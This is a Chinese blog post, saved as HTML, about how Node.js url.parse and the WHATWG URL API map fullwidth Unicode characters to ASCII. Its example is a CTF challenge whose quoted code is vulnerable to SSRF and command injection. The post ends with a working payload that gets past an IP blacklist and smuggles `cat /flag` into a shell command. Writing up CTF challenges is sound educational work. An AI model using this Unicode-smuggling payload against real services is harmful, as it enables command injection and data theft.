@@ -1,0 +1,333 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Node.js中url.parse函数的潜在安全问题 | D6S3&#39;s Blog</title>
+<link rel="shortcut icon" href="https://d6s3.ac.cn/favicon.ico?v=1612021649158">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://d6s3.ac.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Node.js中url.parse函数的潜在安全问题 | D6S3&#39;s Blog - Atom Feed" href="https://d6s3.ac.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="在去年参加网鼎杯半决赛的时候我遇到了一个Node.js的题目，涉及到了url.parse函数，虽然那题解法很多，但我觉得我当时的解法好像不那么常规？我利用了它的一个特性，甚至说不上来这应该叫bug还是feature，总之，研究一下背后的原因..." />
+    <meta name="keywords" content="Node.js,JavaScript" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://d6s3.ac.cn">
+  <img class="avatar" src="https://d6s3.ac.cn/images/avatar.png?v=1612021649158" alt="">
+  </a>
+  <h1 class="site-title">
+    D6S3&#39;s Blog
+  </h1>
+  <p class="site-description">
+    年更博客又来刷存在感了
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/links" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/DD6181S03" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Node.js中url.parse函数的潜在安全问题
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-01-18
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://d6s3.ac.cn/tag/nodejs/" class="post-tag">
+                  # Node.js
+                </a>
+              
+                <a href="https://d6s3.ac.cn/tag/javascript/" class="post-tag">
+                  # JavaScript
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>在去年参加网鼎杯半决赛的时候我遇到了一个Node.js的题目，涉及到了url.parse函数，虽然那题解法很多，但我觉得我当时的解法好像不那么常规？我利用了它的一个特性，甚至说不上来这应该叫bug还是feature，总之，研究一下背后的原因。</p>
+<!-- more -->
+<h2 id="当前状态">当前状态</h2>
+<h3 id="urlparse函数">url.parse函数</h3>
+<p>我最初关注这个问题，是从这个函数开始的。按Node.js Github代码仓库的<a href="https://github.com/nodejs/node/discussions/23694">这个讨论</a>里预定的计划，Node.js 11.x将是url.parse函数最后一个正式存在的版本，此后的12.x版本将该函数标记为Deprecated但不会删除相关代码，从13.x开始有可能彻底删除这些代码。</p>
+<p>开始写这篇文章时是2021年1月，此时最新Node.js版本号为15.6.0，查找Node.js官方文档可知，Node.js 12.x以后的版本确实已经将url.parse函数标记为了Deprecated，但这个函数并没有被真正移除掉，下面要提到的错误解析含Unicode字符URL的问题也没有解决。（受限于该函数的设计，无法直接修复这个问题，参考来源于<a href="https://hackerone.com/reports/678487">这个讨论</a>中Node.js Staff jasnell的回复）</p>
+<h3 id="whatwg-url-api">WHATWG URL API</h3>
+<p>根据Node.js文档的指示，当前应该使用的是WHATWG URL API，但经过测试，<strong>也存在同样的问题</strong>。<s>等于说根本就没解决这个问题呗，绝了。</s></p>
+<h2 id="问题表现">问题表现</h2>
+<h3 id="函数介绍">函数介绍</h3>
+<p>url.parse函数可以将一个URL字符串解析为一个URL对象，函数声明为<code>url.parse(urlString[, parseQueryString[, slashesDenoteHost]])</code>，后两个参数与这次讨论主题关系不大，这里也不解释作用了，我们常用的还是第一个参数<code>urlString</code>，即待解析的URL字符串。</p>
+<h3 id="unicode字符在域名中的表示">Unicode字符在域名中的表示</h3>
+<p>众所周知，在域名系统中所有的字符都应当在ASCII字符集的表示范围当中，但随着互联网的发展，世界各国的人们希望自己常用的语言文字也能出现在域名中，于是出现了国际化域名（IDN, Internationalized Domain Name）这一标准（<a href="https://tools.ietf.org/html/rfc5890">RFC5890</a>）。根据这一标准，使用Punycode（<a href="https://tools.ietf.org/html/rfc3492">RFC3492</a>）将Unicode编码字符转化成ASCII编码字符。</p>
+<p>例如，“中文”二字使用Punycode编码后为&quot;fiq228c&quot;。由于Punycode编码后结果可能含有字符'-'，为了防止原本就含有字符'-'的非国际化域名被错误解释，在域名系统中使用Punycode时，在结果前额外添加&quot;xn--&quot;前缀，例如，“中文域名.中国”的编码结果为&quot;xn--fiq06l2rdsvs.xn--fiqs8s&quot;。</p>
+<h3 id="编码结果对比">编码结果对比</h3>
+<h4 id="预期">预期</h4>
+<p>获取方式：使用CyberChef的To Punycode工具对&quot;http://&quot;之后的内容进行编码</p>
+<pre><code class="language-javascript">&gt; url.parse('http://中文域名.中国').href
+'http://xn--fiq06l2rdsvs.xn--fiqs8s'
+&gt; url.parse('http://test.ⓒn').href
+'http://test.xn--n-lgp'
+&gt; url.parse('http://＇｀cat ／flag｀＇')
+'http://xn--catflag-oha35279cia7f63aja'
+// 最后一个例子中，单引号码位为U+FF07 FULLWIDTH APOSTROPHE
+// 反引号码位为U+FF40 FULLWIDTH GRAVE ACCENT
+// 空格码位为U+00A0 NO-BREAK SPACE
+// 斜杠码位为U+FF0F FULLWIDTH SOLIDUS
+</code></pre>
+<h4 id="实际">实际</h4>
+<p>获取方式：Node.js 15.5.1版本，Archlinux+Konsole环境使用node cli实测</p>
+<pre><code class="language-javascript">&gt; url.parse('http://中文域名.中国').href
+'http://xn--fiq06l2rdsvs.xn--fiqs8s'
+&gt; url.parse('http://test.ⓒn').href
+'http://test.cn'
+&gt; url.parse('http://＇｀cat ／flag｀＇')
+&quot;http://'`cat /flag`'&quot; //此行结果均为ASCII字符
+// 复读一遍，使用new URL('xxx')时，结果也一样
+</code></pre>
+<p>可以看出，url.parse函数在处理某些字符时，并没有严格遵循Punycode的要求，也没有抛出异常等，反而是把它们转换成了一些“类似”的字符，这可能会导致SSRF攻击或URL欺骗攻击。</p>
+<h2 id="问题成因">问题成因</h2>
+<h3 id="相关标准">相关标准</h3>
+<p>在<a href="https://www.unicode.org/reports/tr46/">Unicode技术标准46</a>：Unicode IDNA Compatibility Processing当中指出，2003年提出的IDN系统被称为IDNA2003，在2010年又通过了新版本的IDNA，称为IDNA2008。在IDNA2003的处理过程中第一步就是映射阶段，IDNA2008虽然不需要但也允许进行映射，这一步将大写字母映射到小写字母，以及进行<strong>等效字符间的映射</strong>。</p>
+<p>IDNA2003中给出了一个标志<code>UseSTD3ASCIIRules</code>，用于选择是否遵守<a href="https://www.rfc-editor.org/std/std3.txt">STD3</a>的规则，这个规则严格限制了域名中的字符，而Unicode提供的<a href="https://www.unicode.org/Public/idna/">映射表</a>同时提供了该标志为true或false两种情形下的映射规则，为了实现与IDNA2003的兼容，很多时候此标志都设为false，那么，上面那些Unicode字符被映射到ASCII字符就是映射表所指定的行为了。</p>
+<h4 id="勘误请求">勘误请求</h4>
+<p>我觉得我上面那段话搞不好错误百出，希望能有明白的人来给我纠错……</p>
+<h3 id="代码分析">代码分析</h3>
+<p>暂时没有代码分析，因为对Node.js不甚了解，几百行的JS代码+几千行的C++代码实在看不下来，也不想重新编译一份启用debug的Node.js然后用配置调试环境啥的用调试器跟进去看了（这个可以有，但是得等想填坑的时候再填了）。</p>
+<h2 id="实例">实例</h2>
+<p>搞一个比赛题目放上去，是不是和实际情景有差距，没太有说服力呢，也没办法，我就这一个例子。</p>
+<h3 id="网鼎杯2020半决赛babyjs">网鼎杯2020半决赛：babyJS</h3>
+<h4 id="主要代码">主要代码</h4>
+<pre><code class="language-javascript"># /routes/index.js
+
+var blacklist = ['127.0.0.1.xip.io', '::ffff:127.0.0.1', '127.0.0.1', '0', 'localhost', '0.0.0.0', '[::1]', '::1'];
+
+router.get('/debug', function (req, res, next) {
+  console.log(req.ip);
+  if (blacklist.indexOf(req.ip) != -1) {
+    console.log('res');
+    var u = req.query.url.replace(/[\&quot;\']/ig, '');
+    console.log(url.parse(u).href);
+    let log = `echo  '${url.parse(u).href}'&gt;&gt;/tmp/log`;
+    console.log(log);
+    child_process.exec(log);
+    res.json({ data: fs.readFileSync('/tmp/log').toString() });
+  } else {
+    res.json({});
+  }
+});
+
+router.post('/debug', function (req, res, next) {
+  console.log(req.body);
+  if (req.body.url !== undefined) {
+    var u = req.body.url;
+    var urlObject = url.parse(u);
+    if (blacklist.indexOf(urlObject.hostname) == -1) {
+      var dest = urlObject.href;
+      request(dest, (err, result, body) =&gt; {
+        res.json(body);
+      })
+    }
+    else {
+      res.json([]);
+    }
+  }
+});
+</code></pre>
+<p>可以看出，POST请求/debug路径，造成SSRF GET请求本机/debug路径，即有可能产生命令执行。</p>
+<h4 id="绕过ip黑名单">绕过IP黑名单</h4>
+<p>GET /debug要求请求源IP必须位于blacklist列表中，而POST /debug会将blacklist中的地址过滤，绕过的方法很多，比如<code>0x7f.0.0.1</code>或<code>0177.0.0.1</code>这样用进制转换的方式绕过。初步看，我们POST请求的body部分应该是这样：<code>{&quot;url&quot;:&quot;http://0x7f.0.0.1/debug?url=somepayload&quot;}</code>。</p>
+<h4 id="制造命令执行">制造命令执行</h4>
+<pre><code class="language-javascript">let log = `echo '${url.parse(u).href}' &gt;&gt; /tmp/log`
+console.log(log)
+child_process.exec(log)
+</code></pre>
+<p>要让上面这段代码执行我们想要的命令，方法当然是闭合引号。我们不需要考虑在js层面如何把引号闭合，而是需要最终让log字符串作为shell命令被执行时能够达到我们命令执行的目的。分析整个字符串，我们希望被执行的语句是这样的：<code>echo ''`cat /flag`'' &gt;&gt; /tmp/log</code>，由于反引号的存在，会先执行<code>cat /flag</code>，将其结果和两个''组成的空字符串拼接，一起作为echo命令的参数，最后将echo命令的输出重定向，追加到/tmp/log文件的最后。</p>
+<p>可是，在GET方法中，对单双引号都做了过滤，我们要让请求在被url.parse解析前不包含单引号，而在解析后出现单引号。是不是可以用上文提到的漏洞呢，当然了，Payload就是上文编码结果对比里的最后一个示例。<s>啥，你说二次编码也行？我听不见……听不见……</s></p>
+<p>需要在执行的命令前http://字段的原因在下面源码分析会提到，不加的话，url.parse(u).href的结果就成原样输出了。加了之后对命令执行没啥影响，被执行的时候正好被两个单引号引起来，直接当做文本输出了。</p>
+<h4 id="最终payload">最终Payload</h4>
+<p>大概这样？<code>{&quot;url&quot;:&quot;http://0x7f.0.0.1/debug?url=http://＇｀cat ／flag｀＇&quot;}</code></p>
+<p>还不太行吧，为了让我们精心挑选的特殊字符免于在POST方法的处理中就被转为一般ASCII字符，还需要URL编码一下，最终是这样：</p>
+<p><code>{&quot;url&quot;:&quot;http://0x7f.0.0.1/debug?url=http://%EF%BC%87%EF%BD%80cat%C2%A0%EF%BC%8Fflag%EF%BD%80%EF%BC%87&quot;}</code></p>
+<h2 id="解决方法">解决方法</h2>
+<p>这我哪会啊，一点想法都没有，我都感觉我看那些文档的时候理解的不对，研究不动了，啊我好菜。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%BD%93%E5%89%8D%E7%8A%B6%E6%80%81">当前状态</a>
+<ul>
+<li><a href="#urlparse%E5%87%BD%E6%95%B0">url.parse函数</a></li>
+<li><a href="#whatwg-url-api">WHATWG URL API</a></li>
+</ul>
+</li>
+<li><a href="#%E9%97%AE%E9%A2%98%E8%A1%A8%E7%8E%B0">问题表现</a>
+<ul>
+<li><a href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D">函数介绍</a></li>
+<li><a href="#unicode%E5%AD%97%E7%AC%A6%E5%9C%A8%E5%9F%9F%E5%90%8D%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%A4%BA">Unicode字符在域名中的表示</a></li>
+<li><a href="#%E7%BC%96%E7%A0%81%E7%BB%93%E6%9E%9C%E5%AF%B9%E6%AF%94">编码结果对比</a>
+<ul>
+<li><a href="#%E9%A2%84%E6%9C%9F">预期</a></li>
+<li><a href="#%E5%AE%9E%E9%99%85">实际</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E9%97%AE%E9%A2%98%E6%88%90%E5%9B%A0">问题成因</a>
+<ul>
+<li><a href="#%E7%9B%B8%E5%85%B3%E6%A0%87%E5%87%86">相关标准</a>
+<ul>
+<li><a href="#%E5%8B%98%E8%AF%AF%E8%AF%B7%E6%B1%82">勘误请求</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">代码分析</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a>
+<ul>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs">网鼎杯2020半决赛：babyJS</a>
+<ul>
+<li><a href="#%E4%B8%BB%E8%A6%81%E4%BB%A3%E7%A0%81">主要代码</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87ip%E9%BB%91%E5%90%8D%E5%8D%95">绕过IP黑名单</a></li>
+<li><a href="#%E5%88%B6%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">制造命令执行</a></li>
+<li><a href="#%E6%9C%80%E7%BB%88payload">最终Payload</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">解决方法</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://d6s3.ac.cn/post/javascript-code-protection/">
+              <h3 class="post-title">
+                初探JavaScript代码保护
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by&nbsp;<a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://d6s3.ac.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
